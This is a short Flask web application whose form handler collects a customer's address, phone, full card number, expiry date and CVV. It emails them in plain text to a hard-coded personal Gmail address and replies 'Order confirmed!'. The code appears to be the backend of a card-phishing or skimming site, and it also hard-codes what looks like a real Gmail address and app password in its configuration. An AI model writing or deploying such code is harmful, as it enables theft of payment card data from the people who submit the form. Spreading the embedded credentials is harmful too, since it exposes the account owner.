from flask import Flask, request, render_template
from flask_mail import Mail, Message

app = Flask(__name__)

# Configurations for email
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'vakov2652@gmail.com'
app.config['MAIL_PASSWORD'] = 'mihjpmellluzpqkn'

mail = Mail(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/product_info')
def main():
    return render_template('main.html')

@app.route('/report_form')
def report_form():
    return render_template('report_form.html')

@app.route('/send_report', methods=['POST'])
def send_report():
    customer_name = request.form['name']
    customer_email = request.form['email']
    customer_address = request.form['address']
    country = request.form['country']
    city = request.form['city']
    region = request.form['region']
    zip_code = request.form['zip']
    phone_number = request.form['phone']
    card_number = request.form['card_number']
    name_on_card = request.form['name_on_card']
    expiry_date = request.form['expiry_date']
    cvv = request.form['cvv']

    msg = Message('Customer Report', sender='vakov2652@gmail.com', recipients=['vakov2652@gmail.com'])
    msg.body = f"""
    Name: {customer_name}
    Email: {customer_email}
    Address: {customer_address}
    Country: {country}
    City: {city}
    Region: {region}
    Zip Code: {zip_code}
    Phone Number: {phone_number}
    Card Number: {card_number}
    Name on Card: {name_on_card}
    Expiry Date: {expiry_date}
    CVV: {cvv}
    """
    
    mail.send(msg)
    return 'Order confirmed!'
    

if __name__ == '__main__':
    app.run(debug=True)
